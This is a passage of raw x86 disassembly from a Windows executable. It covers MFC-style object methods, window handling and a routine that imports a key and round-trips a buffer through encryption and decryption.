  40430e:	90                   	nop
  40430f:	90                   	nop
  404310:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404316:	6a ff                	push   $0xffffffff
  404318:	68 a8 37 41 00       	push   $0x4137a8
  40431d:	50                   	push   %eax
  40431e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404325:	83 ec 54             	sub    $0x54,%esp
  404328:	56                   	push   %esi
  404329:	8b f1                	mov    %ecx,%esi
  40432b:	57                   	push   %edi
  40432c:	8a 46 58             	mov    0x58(%esi),%al
  40432f:	84 c0                	test   %al,%al
  404331:	75 07                	jne    0x40433a
  404333:	6a 00                	push   $0x0
  404335:	e8 86 01 00 00       	call   0x4044c0
  40433a:	56                   	push   %esi
  40433b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40433f:	e8 8c ea 00 00       	call   0x412dd0
  404344:	8d 46 48             	lea    0x48(%esi),%eax
  404347:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40434b:	50                   	push   %eax
  40434c:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%esp)
  404353:	00 
  404354:	e8 71 ea 00 00       	call   0x412dca
  404359:	6a 01                	push   $0x1
  40435b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40435f:	8b f8                	mov    %eax,%edi
  404361:	e8 5e ea 00 00       	call   0x412dc4
  404366:	8b 4e 64             	mov    0x64(%esi),%ecx
  404369:	51                   	push   %ecx
  40436a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40436e:	e8 4b ea 00 00       	call   0x412dbe
  404373:	8b 76 40             	mov    0x40(%esi),%esi
  404376:	8b 54 24 08          	mov    0x8(%esp),%edx
  40437a:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40437e:	8b 46 f8             	mov    -0x8(%esi),%eax
  404381:	50                   	push   %eax
  404382:	56                   	push   %esi
  404383:	6a 00                	push   $0x0
  404385:	6a 00                	push   $0x0
  404387:	ff 52 64             	call   *0x64(%edx)
  40438a:	57                   	push   %edi
  40438b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40438f:	e8 36 ea 00 00       	call   0x412dca
  404394:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404398:	c7 44 24 64 ff ff ff 	movl   $0xffffffff,0x64(%esp)
  40439f:	ff 
  4043a0:	e8 13 ea 00 00       	call   0x412db8
  4043a5:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  4043a9:	5f                   	pop    %edi
  4043aa:	5e                   	pop    %esi
  4043ab:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043b2:	83 c4 60             	add    $0x60,%esp
  4043b5:	c3                   	ret
  4043b6:	90                   	nop
  4043b7:	90                   	nop
  4043b8:	90                   	nop
  4043b9:	90                   	nop
  4043ba:	90                   	nop
  4043bb:	90                   	nop
  4043bc:	90                   	nop
  4043bd:	90                   	nop
  4043be:	90                   	nop
  4043bf:	90                   	nop
  4043c0:	56                   	push   %esi
  4043c1:	8b f1                	mov    %ecx,%esi
  4043c3:	e8 0c e9 00 00       	call   0x412cd4
  4043c8:	8d 4e 48             	lea    0x48(%esi),%ecx
  4043cb:	e8 82 e9 00 00       	call   0x412d52
  4043d0:	5e                   	pop    %esi
  4043d1:	c3                   	ret
  4043d2:	90                   	nop
  4043d3:	90                   	nop
  4043d4:	90                   	nop
  4043d5:	90                   	nop
  4043d6:	90                   	nop
  4043d7:	90                   	nop
  4043d8:	90                   	nop
  4043d9:	90                   	nop
  4043da:	90                   	nop
  4043db:	90                   	nop
  4043dc:	90                   	nop
  4043dd:	90                   	nop
  4043de:	90                   	nop
  4043df:	90                   	nop
  4043e0:	56                   	push   %esi
  4043e1:	6a 01                	push   $0x1
  4043e3:	68 00 01 00 00       	push   $0x100
  4043e8:	8b f1                	mov    %ecx,%esi
  4043ea:	6a 00                	push   $0x0
  4043ec:	e8 eb e9 00 00       	call   0x412ddc
  4043f1:	8d 46 40             	lea    0x40(%esi),%eax
  4043f4:	8b ce                	mov    %esi,%ecx
  4043f6:	50                   	push   %eax
  4043f7:	e8 da e9 00 00       	call   0x412dd6
  4043fc:	8b ce                	mov    %esi,%ecx
  4043fe:	c6 46 5a 00          	movb   $0x0,0x5a(%esi)
  404402:	e8 0d e8 00 00       	call   0x412c14
  404407:	5e                   	pop    %esi
  404408:	c3                   	ret
  404409:	90                   	nop
  40440a:	90                   	nop
  40440b:	90                   	nop
  40440c:	90                   	nop
  40440d:	90                   	nop
  40440e:	90                   	nop
  40440f:	90                   	nop
  404410:	8b 41 60             	mov    0x60(%ecx),%eax
  404413:	c6 41 59 00          	movb   $0x0,0x59(%ecx)
  404417:	50                   	push   %eax
  404418:	ff 15 40 56 41 00    	call   *0x415640
  40441e:	33 c0                	xor    %eax,%eax
  404420:	c2 08 00             	ret    $0x8
  404423:	90                   	nop
  404424:	90                   	nop
  404425:	90                   	nop
  404426:	90                   	nop
  404427:	90                   	nop
  404428:	90                   	nop
  404429:	90                   	nop
  40442a:	90                   	nop
  40442b:	90                   	nop
  40442c:	90                   	nop
  40442d:	90                   	nop
  40442e:	90                   	nop
  40442f:	90                   	nop
  404430:	83 ec 10             	sub    $0x10,%esp
  404433:	56                   	push   %esi
  404434:	8b f1                	mov    %ecx,%esi
  404436:	8a 46 59             	mov    0x59(%esi),%al
  404439:	84 c0                	test   %al,%al
  40443b:	75 3e                	jne    0x40447b
  40443d:	85 f6                	test   %esi,%esi
  40443f:	c7 44 24 04 10 00 00 	movl   $0x10,0x4(%esp)
  404446:	00 
  404447:	75 06                	jne    0x40444f
  404449:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40444d:	eb 07                	jmp    0x404456
  40444f:	8b 46 20             	mov    0x20(%esi),%eax
  404452:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404456:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40445a:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  404461:	00 
  404462:	51                   	push   %ecx
  404463:	ff 15 28 50 41 00    	call   *0x415028
  404469:	8b ce                	mov    %esi,%ecx
  40446b:	c6 46 59 01          	movb   $0x1,0x59(%esi)
  40446f:	e8 48 e8 00 00       	call   0x412cbc
  404474:	5e                   	pop    %esi
  404475:	83 c4 10             	add    $0x10,%esp
  404478:	c2 0c 00             	ret    $0xc
  40447b:	8a 46 5a             	mov    0x5a(%esi),%al
  40447e:	84 c0                	test   %al,%al
  404480:	75 07                	jne    0x404489
  404482:	8b ce                	mov    %esi,%ecx
  404484:	e8 a7 00 00 00       	call   0x404530
  404489:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40448d:	8b ce                	mov    %esi,%ecx
  40448f:	52                   	push   %edx
  404490:	e8 4b 01 00 00       	call   0x4045e0
  404495:	84 c0                	test   %al,%al
  404497:	74 05                	je     0x40449e
  404499:	8b 46 5c             	mov    0x5c(%esi),%eax
  40449c:	eb 03                	jmp    0x4044a1
  40449e:	8b 46 60             	mov    0x60(%esi),%eax
  4044a1:	50                   	push   %eax
  4044a2:	ff 15 40 56 41 00    	call   *0x415640
  4044a8:	8b ce                	mov    %esi,%ecx
  4044aa:	e8 0d e8 00 00       	call   0x412cbc
  4044af:	5e                   	pop    %esi
  4044b0:	83 c4 10             	add    $0x10,%esp
  4044b3:	c2 0c 00             	ret    $0xc
  4044b6:	90                   	nop
  4044b7:	90                   	nop
  4044b8:	90                   	nop
  4044b9:	90                   	nop
  4044ba:	90                   	nop
  4044bb:	90                   	nop
  4044bc:	90                   	nop
  4044bd:	90                   	nop
  4044be:	90                   	nop
  4044bf:	90                   	nop
  4044c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4044c4:	83 ec 3c             	sub    $0x3c,%esp
  4044c7:	85 c0                	test   %eax,%eax
  4044c9:	56                   	push   %esi
  4044ca:	8b f1                	mov    %ecx,%esi
  4044cc:	75 2a                	jne    0x4044f8
  4044ce:	8b 46 20             	mov    0x20(%esi),%eax
  4044d1:	50                   	push   %eax
  4044d2:	ff 15 44 56 41 00    	call   *0x415644
  4044d8:	50                   	push   %eax
  4044d9:	e8 ce e8 00 00       	call   0x412dac
  4044de:	8b 48 20             	mov    0x20(%eax),%ecx
  4044e1:	6a 00                	push   $0x0
  4044e3:	6a 00                	push   $0x0
  4044e5:	6a 31                	push   $0x31
  4044e7:	51                   	push   %ecx
  4044e8:	ff 15 30 56 41 00    	call   *0x415630
  4044ee:	50                   	push   %eax
  4044ef:	e8 ee e8 00 00       	call   0x412de2
  4044f4:	85 c0                	test   %eax,%eax
  4044f6:	74 2e                	je     0x404526
  4044f8:	8b 40 04             	mov    0x4(%eax),%eax
  4044fb:	8d 54 24 04          	lea    0x4(%esp),%edx
  4044ff:	52                   	push   %edx
  404500:	6a 3c                	push   $0x3c
  404502:	50                   	push   %eax
  404503:	ff 15 68 50 41 00    	call   *0x415068
  404509:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40450d:	c6 44 24 19 01       	movb   $0x1,0x19(%esp)
  404512:	51                   	push   %ecx
  404513:	ff 15 6c 50 41 00    	call   *0x41506c
  404519:	50                   	push   %eax
  40451a:	8d 4e 48             	lea    0x48(%esi),%ecx
  40451d:	e8 3c e8 00 00       	call   0x412d5e
  404522:	c6 46 58 01          	movb   $0x1,0x58(%esi)
  404526:	5e                   	pop    %esi
  404527:	83 c4 3c             	add    $0x3c,%esp
  40452a:	c2 04 00             	ret    $0x4
  40452d:	90                   	nop
  40452e:	90                   	nop
  40452f:	90                   	nop
  404530:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404536:	6a ff                	push   $0xffffffff
  404538:	68 c8 37 41 00       	push   $0x4137c8
  40453d:	50                   	push   %eax
  40453e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404545:	83 ec 1c             	sub    $0x1c,%esp
  404548:	56                   	push   %esi
  404549:	8b f1                	mov    %ecx,%esi
  40454b:	8a 46 5a             	mov    0x5a(%esi),%al
  40454e:	84 c0                	test   %al,%al
  404550:	75 6f                	jne    0x4045c1
  404552:	8a 46 58             	mov    0x58(%esi),%al
  404555:	84 c0                	test   %al,%al
  404557:	74 68                	je     0x4045c1
  404559:	57                   	push   %edi
  40455a:	56                   	push   %esi
  40455b:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40455f:	e8 8a e8 00 00       	call   0x412dee
  404564:	8d 46 48             	lea    0x48(%esi),%eax
  404567:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40456b:	50                   	push   %eax
  40456c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404573:	00 
  404574:	e8 51 e8 00 00       	call   0x412dca
  404579:	8b f8                	mov    %eax,%edi
  40457b:	8b 46 40             	mov    0x40(%esi),%eax
  40457e:	8d 54 24 08          	lea    0x8(%esp),%edx
  404582:	8b 48 f8             	mov    -0x8(%eax),%ecx
  404585:	52                   	push   %edx
  404586:	51                   	push   %ecx
  404587:	50                   	push   %eax
  404588:	8b 44 24 24          	mov    0x24(%esp),%eax
  40458c:	50                   	push   %eax
  40458d:	ff 15 64 50 41 00    	call   *0x415064
  404593:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404597:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40459b:	89 4e 50             	mov    %ecx,0x50(%esi)
  40459e:	57                   	push   %edi
  40459f:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4045a3:	89 56 54             	mov    %edx,0x54(%esi)
  4045a6:	e8 1f e8 00 00       	call   0x412dca
  4045ab:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4045af:	c6 46 5a 01          	movb   $0x1,0x5a(%esi)
  4045b3:	c7 44 24 2c ff ff ff 	movl   $0xffffffff,0x2c(%esp)
  4045ba:	ff 
  4045bb:	e8 28 e8 00 00       	call   0x412de8
  4045c0:	5f                   	pop    %edi
  4045c1:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4045c5:	5e                   	pop    %esi
  4045c6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4045cd:	83 c4 28             	add    $0x28,%esp
  4045d0:	c3                   	ret
  4045d1:	90                   	nop
  4045d2:	90                   	nop
  4045d3:	90                   	nop
  4045d4:	90                   	nop
  4045d5:	90                   	nop
  4045d6:	90                   	nop
  4045d7:	90                   	nop
  4045d8:	90                   	nop
  4045d9:	90                   	nop
  4045da:	90                   	nop
  4045db:	90                   	nop
  4045dc:	90                   	nop
  4045dd:	90                   	nop
  4045de:	90                   	nop
  4045df:	90                   	nop
  4045e0:	8a 41 5a             	mov    0x5a(%ecx),%al
  4045e3:	84 c0                	test   %al,%al
  4045e5:	75 05                	jne    0x4045ec
  4045e7:	32 c0                	xor    %al,%al
  4045e9:	c2 04 00             	ret    $0x4
  4045ec:	8b 54 24 04          	mov    0x4(%esp),%edx
  4045f0:	8b 02                	mov    (%edx),%eax
  4045f2:	85 c0                	test   %eax,%eax
  4045f4:	7c 1d                	jl     0x404613
  4045f6:	56                   	push   %esi
  4045f7:	8b 71 50             	mov    0x50(%ecx),%esi
  4045fa:	3b c6                	cmp    %esi,%eax
  4045fc:	5e                   	pop    %esi
  4045fd:	7d 14                	jge    0x404613
  4045ff:	8b 42 04             	mov    0x4(%edx),%eax
  404602:	85 c0                	test   %eax,%eax
  404604:	7c 0d                	jl     0x404613
  404606:	3b 41 54             	cmp    0x54(%ecx),%eax
  404609:	7d 08                	jge    0x404613
  40460b:	b8 01 00 00 00       	mov    $0x1,%eax
  404610:	c2 04 00             	ret    $0x4
  404613:	33 c0                	xor    %eax,%eax
  404615:	c2 04 00             	ret    $0x4
  404618:	90                   	nop
  404619:	90                   	nop
  40461a:	90                   	nop
  40461b:	90                   	nop
  40461c:	90                   	nop
  40461d:	90                   	nop
  40461e:	90                   	nop
  40461f:	90                   	nop
  404620:	56                   	push   %esi
  404621:	8b f1                	mov    %ecx,%esi
  404623:	e8 6c e7 00 00       	call   0x412d94
  404628:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40462d:	74 09                	je     0x404638
  40462f:	56                   	push   %esi
  404630:	e8 63 e6 00 00       	call   0x412c98
  404635:	83 c4 04             	add    $0x4,%esp
  404638:	8b c6                	mov    %esi,%eax
  40463a:	5e                   	pop    %esi
  40463b:	c2 04 00             	ret    $0x4
  40463e:	90                   	nop
  40463f:	90                   	nop
  404640:	56                   	push   %esi
  404641:	8b f1                	mov    %ecx,%esi
  404643:	33 c0                	xor    %eax,%eax
  404645:	89 46 04             	mov    %eax,0x4(%esi)
  404648:	89 46 08             	mov    %eax,0x8(%esi)
  40464b:	89 46 0c             	mov    %eax,0xc(%esi)
  40464e:	8d 46 10             	lea    0x10(%esi),%eax
  404651:	50                   	push   %eax
  404652:	c7 06 30 5e 41 00    	movl   $0x415e30,(%esi)
  404658:	ff 15 3c 51 41 00    	call   *0x41513c
  40465e:	8b c6                	mov    %esi,%eax
  404660:	5e                   	pop    %esi
  404661:	c3                   	ret
  404662:	90                   	nop
  404663:	90                   	nop
  404664:	90                   	nop
  404665:	90                   	nop
  404666:	90                   	nop
  404667:	90                   	nop
  404668:	90                   	nop
  404669:	90                   	nop
  40466a:	90                   	nop
  40466b:	90                   	nop
  40466c:	90                   	nop
  40466d:	90                   	nop
  40466e:	90                   	nop
  40466f:	90                   	nop
  404670:	56                   	push   %esi
  404671:	8b f1                	mov    %ecx,%esi
  404673:	e8 18 00 00 00       	call   0x404690
  404678:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40467d:	74 09                	je     0x404688
  40467f:	56                   	push   %esi
  404680:	e8 13 e6 00 00       	call   0x412c98
  404685:	83 c4 04             	add    $0x4,%esp
  404688:	8b c6                	mov    %esi,%eax
  40468a:	5e                   	pop    %esi
  40468b:	c2 04 00             	ret    $0x4
  40468e:	90                   	nop
  40468f:	90                   	nop
  404690:	c7 01 30 5e 41 00    	movl   $0x415e30,(%ecx)
  404696:	83 c1 10             	add    $0x10,%ecx
  404699:	51                   	push   %ecx
  40469a:	ff 15 40 51 41 00    	call   *0x415140
  4046a0:	c3                   	ret
  4046a1:	90                   	nop
  4046a2:	90                   	nop
  4046a3:	90                   	nop
  4046a4:	90                   	nop
  4046a5:	90                   	nop
  4046a6:	90                   	nop
  4046a7:	90                   	nop
  4046a8:	90                   	nop
  4046a9:	90                   	nop
  4046aa:	90                   	nop
  4046ab:	90                   	nop
  4046ac:	90                   	nop
  4046ad:	90                   	nop
  4046ae:	90                   	nop
  4046af:	90                   	nop
  4046b0:	56                   	push   %esi
  4046b1:	57                   	push   %edi
  4046b2:	33 f6                	xor    %esi,%esi
  4046b4:	8d 79 04             	lea    0x4(%ecx),%edi
  4046b7:	8b c6                	mov    %esi,%eax
  4046b9:	68 00 00 00 f0       	push   $0xf0000000
  4046be:	f7 d8                	neg    %eax
  4046c0:	1b c0                	sbb    %eax,%eax
  4046c2:	6a 18                	push   $0x18
  4046c4:	25 28 0c 42 00       	and    $0x420c28,%eax
  4046c9:	50                   	push   %eax
  4046ca:	6a 00                	push   $0x0
  4046cc:	57                   	push   %edi
  4046cd:	ff 15 c0 17 42 00    	call   *0x4217c0
  4046d3:	85 c0                	test   %eax,%eax
  4046d5:	75 09                	jne    0x4046e0
  4046d7:	46                   	inc    %esi
  4046d8:	83 fe 02             	cmp    $0x2,%esi
  4046db:	7c da                	jl     0x4046b7
  4046dd:	5f                   	pop    %edi
  4046de:	5e                   	pop    %esi
  4046df:	c3                   	ret
  4046e0:	5f                   	pop    %edi
  4046e1:	b8 01 00 00 00       	mov    $0x1,%eax
  4046e6:	5e                   	pop    %esi
  4046e7:	c3                   	ret
  4046e8:	90                   	nop
  4046e9:	90                   	nop
  4046ea:	90                   	nop
  4046eb:	90                   	nop
  4046ec:	90                   	nop
  4046ed:	90                   	nop
  4046ee:	90                   	nop
  4046ef:	90                   	nop
  4046f0:	56                   	push   %esi
  4046f1:	8b f1                	mov    %ecx,%esi
  4046f3:	e8 b8 ff ff ff       	call   0x4046b0
  4046f8:	85 c0                	test   %eax,%eax
  4046fa:	75 0d                	jne    0x404709
  4046fc:	8b ce                	mov    %esi,%ecx
  4046fe:	e8 6d 00 00 00       	call   0x404770
  404703:	33 c0                	xor    %eax,%eax
  404705:	5e                   	pop    %esi
  404706:	c2 04 00             	ret    $0x4
  404709:	8b 44 24 08          	mov    0x8(%esp),%eax
  40470d:	85 c0                	test   %eax,%eax
  40470f:	75 2d                	jne    0x40473e
  404711:	8b 4e 04             	mov    0x4(%esi),%ecx
  404714:	8d 46 08             	lea    0x8(%esi),%eax
  404717:	50                   	push   %eax
  404718:	6a 00                	push   $0x0
  40471a:	6a 00                	push   $0x0
  40471c:	68 94 04 00 00       	push   $0x494
  404721:	68 94 07 42 00       	push   $0x420794
  404726:	51                   	push   %ecx
  404727:	ff 15 c4 17 42 00    	call   *0x4217c4
  40472d:	85 c0                	test   %eax,%eax
  40472f:	75 2f                	jne    0x404760
  404731:	8b ce                	mov    %esi,%ecx
  404733:	e8 38 00 00 00       	call   0x404770
  404738:	33 c0                	xor    %eax,%eax
  40473a:	5e                   	pop    %esi
  40473b:	c2 04 00             	ret    $0x4
  40473e:	50                   	push   %eax
  40473f:	8b 46 04             	mov    0x4(%esi),%eax
  404742:	8d 56 08             	lea    0x8(%esi),%edx
  404745:	52                   	push   %edx
  404746:	50                   	push   %eax
  404747:	e8 64 02 00 00       	call   0x4049b0
  40474c:	83 c4 0c             	add    $0xc,%esp
  40474f:	85 c0                	test   %eax,%eax
  404751:	75 0d                	jne    0x404760
  404753:	8b ce                	mov    %esi,%ecx
  404755:	e8 16 00 00 00       	call   0x404770
  40475a:	33 c0                	xor    %eax,%eax
  40475c:	5e                   	pop    %esi
  40475d:	c2 04 00             	ret    $0x4
  404760:	b8 01 00 00 00       	mov    $0x1,%eax
  404765:	5e                   	pop    %esi
  404766:	c2 04 00             	ret    $0x4
  404769:	90                   	nop
  40476a:	90                   	nop
  40476b:	90                   	nop
  40476c:	90                   	nop
  40476d:	90                   	nop
  40476e:	90                   	nop
  40476f:	90                   	nop
  404770:	56                   	push   %esi
  404771:	8b f1                	mov    %ecx,%esi
  404773:	8b 46 08             	mov    0x8(%esi),%eax
  404776:	85 c0                	test   %eax,%eax
  404778:	74 0e                	je     0x404788
  40477a:	50                   	push   %eax
  40477b:	ff 15 c8 17 42 00    	call   *0x4217c8
  404781:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  404788:	8b 46 0c             	mov    0xc(%esi),%eax
  40478b:	85 c0                	test   %eax,%eax
  40478d:	74 0e                	je     0x40479d
  40478f:	50                   	push   %eax
  404790:	ff 15 c8 17 42 00    	call   *0x4217c8
  404796:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  40479d:	8b 46 04             	mov    0x4(%esi),%eax
  4047a0:	85 c0                	test   %eax,%eax
  4047a2:	74 10                	je     0x4047b4
  4047a4:	6a 00                	push   $0x0
  4047a6:	50                   	push   %eax
  4047a7:	ff 15 08 50 41 00    	call   *0x415008
  4047ad:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4047b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4047b9:	5e                   	pop    %esi
  4047ba:	c3                   	ret
  4047bb:	90                   	nop
  4047bc:	90                   	nop
  4047bd:	90                   	nop
  4047be:	90                   	nop
  4047bf:	90                   	nop
  4047c0:	55                   	push   %ebp
  4047c1:	8b ec                	mov    %esp,%ebp
  4047c3:	6a ff                	push   $0xffffffff
  4047c5:	68 38 5e 41 00       	push   $0x415e38
  4047ca:	68 50 30 41 00       	push   $0x413050
  4047cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4047d5:	50                   	push   %eax
  4047d6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4047dd:	81 ec 1c 02 00 00    	sub    $0x21c,%esp
  4047e3:	53                   	push   %ebx
  4047e4:	56                   	push   %esi
  4047e5:	57                   	push   %edi
  4047e6:	8b d9                	mov    %ecx,%ebx
  4047e8:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  4047ee:	a1 60 0c 42 00       	mov    0x420c60,%eax
  4047f3:	89 85 dc fd ff ff    	mov    %eax,-0x224(%ebp)
  4047f9:	8b 0d 64 0c 42 00    	mov    0x420c64,%ecx
  4047ff:	89 8d e0 fd ff ff    	mov    %ecx,-0x220(%ebp)
  404805:	8a 15 68 0c 42 00    	mov    0x420c68,%dl
  40480b:	88 95 e4 fd ff ff    	mov    %dl,-0x21c(%ebp)
  404811:	c6 85 e5 fd ff ff 00 	movb   $0x0,-0x21b(%ebp)
  404818:	c6 85 e8 fd ff ff 00 	movb   $0x0,-0x218(%ebp)
  40481f:	b9 7f 00 00 00       	mov    $0x7f,%ecx
  404824:	33 c0                	xor    %eax,%eax
  404826:	8d bd e9 fd ff ff    	lea    -0x217(%ebp),%edi
  40482c:	f3 ab                	rep stos %eax,%es:(%edi)
  40482e:	66 ab                	stos   %ax,%es:(%edi)
  404830:	aa                   	stos   %al,%es:(%edi)
  404831:	8d bd dc fd ff ff    	lea    -0x224(%ebp),%edi
  404837:	83 c9 ff             	or     $0xffffffff,%ecx
  40483a:	33 c0                	xor    %eax,%eax
  40483c:	f2 ae                	repnz scas %es:(%edi),%al
  40483e:	f7 d1                	not    %ecx
  404840:	49                   	dec    %ecx
  404841:	89 8d d8 fd ff ff    	mov    %ecx,-0x228(%ebp)
  404847:	8b cb                	mov    %ebx,%ecx
  404849:	e8 62 fe ff ff       	call   0x4046b0
  40484e:	85 c0                	test   %eax,%eax
  404850:	0f 84 9d 00 00 00    	je     0x4048f3
  404856:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40485d:	8d 43 08             	lea    0x8(%ebx),%eax
  404860:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404863:	51                   	push   %ecx
  404864:	50                   	push   %eax
  404865:	8b 53 04             	mov    0x4(%ebx),%edx
  404868:	52                   	push   %edx
  404869:	e8 42 01 00 00       	call   0x4049b0
  40486e:	83 c4 0c             	add    $0xc,%esp
  404871:	85 c0                	test   %eax,%eax
  404873:	0f 84 1c 01 00 00    	je     0x404995
  404879:	8d 43 0c             	lea    0xc(%ebx),%eax
  40487c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40487f:	51                   	push   %ecx
  404880:	50                   	push   %eax
  404881:	8b 53 04             	mov    0x4(%ebx),%edx
  404884:	52                   	push   %edx
  404885:	e8 26 01 00 00       	call   0x4049b0
  40488a:	83 c4 0c             	add    $0xc,%esp
  40488d:	85 c0                	test   %eax,%eax
  40488f:	0f 84 00 01 00 00    	je     0x404995
  404895:	8d bd dc fd ff ff    	lea    -0x224(%ebp),%edi
  40489b:	8d 95 e8 fd ff ff    	lea    -0x218(%ebp),%edx
  4048a1:	83 c9 ff             	or     $0xffffffff,%ecx
  4048a4:	33 c0                	xor    %eax,%eax
  4048a6:	f2 ae                	repnz scas %es:(%edi),%al
  4048a8:	f7 d1                	not    %ecx
  4048aa:	2b f9                	sub    %ecx,%edi
  4048ac:	8b c1                	mov    %ecx,%eax
  4048ae:	8b f7                	mov    %edi,%esi
  4048b0:	8b fa                	mov    %edx,%edi
  4048b2:	c1 e9 02             	shr    $0x2,%ecx
  4048b5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4048b7:	8b c8                	mov    %eax,%ecx
  4048b9:	83 e1 03             	and    $0x3,%ecx
  4048bc:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4048be:	68 00 02 00 00       	push   $0x200
  4048c3:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  4048c9:	51                   	push   %ecx
  4048ca:	8d 95 e8 fd ff ff    	lea    -0x218(%ebp),%edx
  4048d0:	52                   	push   %edx
  4048d1:	6a 00                	push   $0x0
  4048d3:	6a 01                	push   $0x1
  4048d5:	6a 00                	push   $0x0
  4048d7:	8b 43 08             	mov    0x8(%ebx),%eax
  4048da:	50                   	push   %eax
  4048db:	ff 15 cc 17 42 00    	call   *0x4217cc
  4048e1:	85 c0                	test   %eax,%eax
  4048e3:	75 23                	jne    0x404908
  4048e5:	6a ff                	push   $0xffffffff
  4048e7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4048ea:	51                   	push   %ecx
  4048eb:	e8 66 e7 00 00       	call   0x413056
  4048f0:	83 c4 08             	add    $0x8,%esp
  4048f3:	33 c0                	xor    %eax,%eax
  4048f5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4048f8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4048ff:	5f                   	pop    %edi
  404900:	5e                   	pop    %esi
  404901:	5b                   	pop    %ebx
  404902:	8b e5                	mov    %ebp,%esp
  404904:	5d                   	pop    %ebp
  404905:	c2 08 00             	ret    $0x8
  404908:	8d 95 d8 fd ff ff    	lea    -0x228(%ebp),%edx
  40490e:	52                   	push   %edx
  40490f:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  404915:	50                   	push   %eax
  404916:	6a 00                	push   $0x0
  404918:	6a 01                	push   $0x1
  40491a:	6a 00                	push   $0x0
  40491c:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  40491f:	51                   	push   %ecx
  404920:	ff 15 d0 17 42 00    	call   *0x4217d0
  404926:	85 c0                	test   %eax,%eax
  404928:	75 08                	jne    0x404932
  40492a:	6a ff                	push   $0xffffffff
  40492c:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40492f:	52                   	push   %edx
  404930:	eb b9                	jmp    0x4048eb
  404932:	8d bd dc fd ff ff    	lea    -0x224(%ebp),%edi
  404938:	83 c9 ff             	or     $0xffffffff,%ecx
  40493b:	33 c0                	xor    %eax,%eax
  40493d:	f2 ae                	repnz scas %es:(%edi),%al
  40493f:	f7 d1                	not    %ecx
  404941:	49                   	dec    %ecx
  404942:	51                   	push   %ecx
  404943:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  404949:	50                   	push   %eax
  40494a:	8d 8d e8 fd ff ff    	lea    -0x218(%ebp),%ecx
  404950:	51                   	push   %ecx
  404951:	ff 15 b4 55 41 00    	call   *0x4155b4
  404957:	83 c4 0c             	add    $0xc,%esp
  40495a:	85 c0                	test   %eax,%eax
  40495c:	75 26                	jne    0x404984
  40495e:	6a ff                	push   $0xffffffff
  404960:	8d 55 f0             	lea    -0x10(%ebp),%edx
  404963:	52                   	push   %edx
  404964:	e8 ed e6 00 00       	call   0x413056
  404969:	83 c4 08             	add    $0x8,%esp
  40496c:	b8 01 00 00 00       	mov    $0x1,%eax
  404971:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404974:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40497b:	5f                   	pop    %edi
  40497c:	5e                   	pop    %esi
  40497d:	5b                   	pop    %ebx
  40497e:	8b e5                	mov    %ebp,%esp
  404980:	5d                   	pop    %ebp
  404981:	c2 08 00             	ret    $0x8
  404984:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40498b:	e8 16 00 00 00       	call   0x4049a6
  404990:	e9 5e ff ff ff       	jmp    0x4048f3
  404995:	6a ff                	push   $0xffffffff
  404997:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40499a:	50                   	push   %eax
  40499b:	e9 4b ff ff ff       	jmp    0x4048eb
  4049a0:	8b 9d d4 fd ff ff    	mov    -0x22c(%ebp),%ebx
  4049a6:	8b cb                	mov    %ebx,%ecx
  4049a8:	e8 c3 fd ff ff       	call   0x404770
  4049ad:	c3                   	ret
  4049ae:	90                   	nop
  4049af:	90                   	nop
  4049b0:	55                   	push   %ebp
  4049b1:	8b ec                	mov    %esp,%ebp
